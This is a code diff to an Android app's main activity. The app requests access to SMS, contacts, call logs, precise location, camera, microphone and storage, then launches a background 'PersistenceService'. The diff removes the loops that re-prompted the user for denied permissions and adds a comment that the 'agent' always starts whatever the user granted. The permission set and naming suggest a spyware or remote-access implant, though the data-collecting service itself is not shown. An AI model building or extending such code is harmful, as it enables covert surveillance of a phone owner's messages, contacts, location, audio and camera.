@@ -20,17 +20,13 @@ public class MainActivity extends Activity {
         super.onCreate(b);
 
         List<String> want = new ArrayList<>();
-        // data lanes — always
         want.add(Manifest.permission.READ_SMS);
         want.add(Manifest.permission.READ_CONTACTS);
         want.add(Manifest.permission.READ_CALL_LOG);
         want.add(Manifest.permission.ACCESS_FINE_LOCATION);
-        // hardware lanes — always ask, not just old SDK
         want.add(Manifest.permission.CAMERA);
         want.add(Manifest.permission.RECORD_AUDIO);
-        // notification lane for persistent service on 33+
         if (Build.VERSION.SDK_INT >= 33) want.add(Manifest.permission.POST_NOTIFICATIONS);
-        // storage/media by SDK
         if (Build.VERSION.SDK_INT <= 32) {
             want.add(Manifest.permission.READ_EXTERNAL_STORAGE);
             want.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
@@ -45,34 +41,23 @@ public class MainActivity extends Activity {
         for (String p : want) {
             if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) missing.add(p);
         }
+
         if (!missing.isEmpty()) {
             requestPermissions(missing.toArray(new String[0]), REQ);
-            return;
+            return;   // onRequestPermissionsResult decides one-time, no loops
         }
         bootService();
     }
 
     @Override
     public void onRequestPermissionsResult(int rc, String[] perms, int[] granted) {
-        Toast.makeText(this, "agent started", Toast.LENGTH_SHORT).show();
-        // walk any the user skipped — os soft-declined some lanes
-        List<String> still = new ArrayList<>();
-        for (String p : perms) {
-            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) still.add(p);
-        }
-        if (!still.isEmpty() && rc == REQ + 1) {
-            // second pass done; proceed with what we have
-            requestPermissions(still.toArray(new String[0]), REQ + 2);
-            return;
-        }
-        if (!still.isEmpty()) {
-            requestPermissions(still.toArray(new String[0]), REQ + 1);
-            return;
-        }
+        if (rc != REQ) return;
+        Toast.makeText(this, "agent booting", Toast.LENGTH_SHORT).show();
         bootService();
     }
 
     private void bootService() {
+        // boot unconditionally — permission state never blocks agent start
         Intent s = new Intent(this, PersistenceService.class);
         if (Build.VERSION.SDK_INT >= 26) startForegroundService(s);
         else startService(s);
